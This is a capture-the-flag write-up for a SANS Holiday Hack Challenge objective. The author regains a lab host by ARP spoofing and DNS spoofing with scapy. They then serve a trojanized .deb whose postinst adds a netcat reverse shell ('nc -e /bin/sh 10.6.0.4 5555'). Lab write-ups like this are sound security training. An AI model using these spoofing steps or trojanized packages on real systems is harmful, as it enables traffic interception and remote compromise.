# Objective 9 – ARP Shennanigans #

## OBJECTIVE: ##
>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP.  Retrieve the document at `/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`.  Who recused herself from the vote described on the document?
#  

## HINTS ##
<details>
  <summary>Hints provided for Objective 9</summary>
 
>-	**ALABASTER SNOWBALL:** Jack Frost must have gotten malware on our host at `10.6.6.35` because we can no longer access it.  Try sniffing the eth0 interface using `tcpdump -nni eth0` to see if you can view any traffic from that host.
>-	**ALABASTER SNOWBALL:** The host is performing an ARP request.  Perhaps we could do a spoof to perform a machine-in-the-middle attack.  I think we have some simple `scapy` traffic scripts that could help you in `/home/guests/scripts`.
>-	**ALABASTER SNOWBALL:** Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof.  Let’s return a DNS response resolving the request to our IP.
>-	**ALABASTER SNOWBALL:** The malware on the host does an HTTP request for a .deb package.  Maybe we can get command line access by sending it [a command in a customized .deb file](http://www.wannescolman.be/?p=98).



</details>

#  
## PROCEDURE: ##
Well... judging juist by the sheer amount of hints we get for this objective; I’m guessing it’s going to be a tough one!

Let’s start by following the hints.  Running ``tcpdump -nni eth0``.  We see a number of ARP requests for `10.6.6.53` from `10.6.6.35` (which is the host we need to regain access to).  At this point I’m guessing that `10.6.6.53` is a malicious machine and that `10.6.6.35` is trying to reach it to establish some kind of reverse shell.  So maybe we can get `10.6.6.35` to believe that we are `10.6.6.53`.

We can sniff and record packets by entering `scapy` and running ``pkts = sniff(iface=’eth0’)``.  We can then view specific packets by referencing ``pkts[x]``  or ``pkts.summary()``.

From one of the logged Scapy entries we can see that the `10.6.6.35` machine has a MAC of `4c:24:57:ab:ed:84`
 ![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/89959548-43c7-4e9f-a933-79bcceb779af)

We need to properly craft an ARP response:

`Ether_resp = Ether(dst=4c:24:57:ab:ed:84, type=0x806, src=02:42:0a:06:00:02)`

`arp_response.op=2` *because this is an ARP response*

`arp_response.plen=4` *because there are 4 octets in a IPv4 address*

`arp_response.hwlen=6` *because there are 6 octets in an Ethernet address*

`arp_response.ptype=0x800` *this is the code for IPv4*

`arp_response.hwtype=0x1` *this is the code for Ethernet*

`arp_response.hwsrc="02:42:0a:06:00:02"` *this is my terminal’s MAC*

`arp_response.psrc="10.6.6.53"` *this is the IP I’m spoofing*

`arp_response.hwdst=4c:24:57:ab:ed:84` *this is the MAC obtained in Scapy*

`arp_response.pdst="10.6.6.35"` *this is the IP we’re sending the response to.*


After running `./arp_resp.py` I can see the following output on the tcpdump – looks like a DNS request so I must be on the right track:
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/efd14fb2-f627-43b4-9fb3-8e6dee1ec5a3)

It is also possible toget more details from the Scapy sniff – the DNS portion is particularly useful now.
```
<Ether  dst=02:42:0a:06:00:02 src=4c:24:57:ab:ed:84 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=60 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x5a4d src=10.6.6.35 dst=10.6.6.53 |<UDP  sport=42244 dport=domain len=40 chksum=0x9559 |<DNS  id=0 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0 z=0 ad=0 cd=0 rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNSQR  qname='ftp.osuosl.org.' qtype=A qclass=IN |> an=None ns=None ar=None |>>>>
```

Thanks to the hints I now know that I need to spoof a DNS response and have it point to my terminal.  For this I need to update the `dns_resp.py` script with the following parameters:
```
ipaddr_we_arp_spoofed = "10.6.6.53"
eth = Ether(src="02:42:0a:06:00:02", dst="4c:24:57:ab:ed:84")
ip=IP(dst="10.6.6.35", src="10.6.6.53")
udp=UDP(dport=12773,sport=53)
    dns = DNS(
      id=packet[DNS].id,
      qd=packet[DNS].qd,
      aa=1,
      qr=1,
      ancount=1,
      an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr)
    )
```
To figure out this last bit I had to resort to asking for help on Discord.  **@elakamarcus#5519** helped me out a lot by pointing me towards [a nice script](https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html) online which I used for reference to create my own scipts; [arp_resp.py](code/arp_resp.py) and [dns_resp.py](code/dns_resp.py). 

With the scripts ready I started ``tcpdump –nni eth0 –w outfile.pcap`` in one terminal then ran ``./dns_resp.py`` in another terminal and left it running.  Finally I ran ``./arp_resp.py`` in the third terminal and this generated the ARP response we did previously, and then a DNS response to the request that was triggered.  

Looking at the resulting pcap file in Scapy;
```
>>>f=rdpcap(“/home/guest/outfile.pcap”)
>>>f.summary()
>>>f[IP].summary()
```
We now see a number of new requests including http requests.

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/0cccf691-cc10-484e-8647-1a13c44b1d85)
 

We can use ``>>> hexdump(f[IP][12].load)`` to see the contents of individual packets.

I now started up a http server as suggested by the HELP.md file:
```
~$ python3 –m http.server 80
```

If I try sending out the crafted ARP response and DNS response packets again I receive a GET instruction on the http server and guess what?.... it looks like Jack Frost is trying to download a file called `suriv_amd64.deb`!

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/61051b2c-f2e1-4eb5-9a66-39dba2de50d9)

 
Well this seems like an opportunity to pass on my own .deb file with a reverse shell to give me access to the compromised terminal.
I created an empty file called `suriv_amd64.deb` and the `/pub/jfrost/backdoor/` directories and I confirm that the file is being download with my http server returning code 200 now.
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/377aae44-d9ed-4d79-ae30-8da4fd0cbf68)
  
OK – so all I need is to find some way to make the deb file open a reverse shell when it is installed on the compromised machine.  This is where [the link in one of the hints for this objective](http://www.wannescolman.be/?p=98) came in very handy.

I took the Netcat debian file found in the `debs/` folder and de-packaged it to a temporary folder called `work/`: 
```
~$ dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work
```

I created a directory called `DEBIAN` in work
```
~$ mkdir work/DEBIAN
```

I extracted the `control` and `postinst` files from the deb package and moved them to the `work/DEBIAN/` directory:
```
~$ ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb
~$ tar -xf control.tar.xz ./control
~$ tar -xf control.tar.xz ./postinst
~$ mv control work/DEBIAN/
~$ mv postinst work/DEBIAN/
```

Now I added a line to the end of the `postinst` file to have it establish a Netcat reverse shell (We know that Netcat is installed if the deb has been run).
```
~$ echo “nc -e /bin/sh 10.6.0.4 5555” >> work/DEBIAN/postinst
```

And I re-package the deb file:
```
~$ dpkg-deb --build work/
```

Finally I moved the .deb file to the web server, renaming it to the file Jack Frost is looking for:
```
~$ mv work.deb /home/guest/pub/jfrost/backdoor/suriv_amd64.deb
```

Now we start a Netcat listener, start the web server, run the DNS response script and the ARP response script and after a few seconds – we have a Netcat session up and running!  
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/87d67274-fb8c-4da2-8e5d-897ed90dfbe0)

Conveniently I’m in the same directory as `NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt` and I can simply see its contents with `cat`:
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/82d7b466-78d4-487f-acd9-bf649459aa26)

That’s it – **Tanta Kringle** was the one who recused herself from the vote.  I can’t believe I made it this far!!
